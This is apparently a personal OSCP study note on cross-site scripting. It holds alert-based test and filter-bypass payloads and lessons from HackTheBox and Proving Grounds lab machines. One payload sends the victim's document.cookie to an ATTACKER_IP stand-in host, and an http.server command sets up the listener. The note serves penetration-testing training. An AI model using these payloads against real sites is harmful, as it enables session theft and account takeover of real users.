# XSS (Cross-Site Scripting)

See also: [[Web-Methodology]]

Less common on OSCP but can appear — usually to steal cookies or trigger actions as another user.

## Test Payloads

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(1)</script>
'><script>alert(1)</script>
javascript:REDACTED(1)
```

## Cookie Stealing

```html
<script>new Image().src="http://ATTACKER_IP/?c="+document.cookie;</script>
```

Listen:

```bash
python3 -m http.server 80
```

## Filter Bypass

```html
<ScRiPt>alert(1)</ScRiPt>
<img src=x onerror="alert(1)">
<body onload=alert(1)>
<svg/onload=alert(1)>
<input onfocus=alert(1) autofocus>
```

## Typical OSCP Use

- Steal admin session cookie via stored XSS
- Trigger password change or admin action as victim
- Chain with CSRF to perform authenticated actions

## From Your Boxes

> **SecNotes** (HTB) — CSRF chained with contact form to steal admin session
> - What worked: Password reset URL accepted GET params, sent via "Contact Us" form to admin tyler who clicked it automatically
> - Not traditional XSS, but same principle: getting a user to visit your crafted URL
> - Lesson: If XSS isn't possible, check if CSRF works — password resets accepting GET are a goldmine

> **Sorcerer** (PG) — Stored XSS indicators in web app (login portal with script tags in page source)
> - Page source contained inline `<script>` tags handling form data
> - Lesson: Check page source for inline JS that handles user input — potential DOM XSS vectors
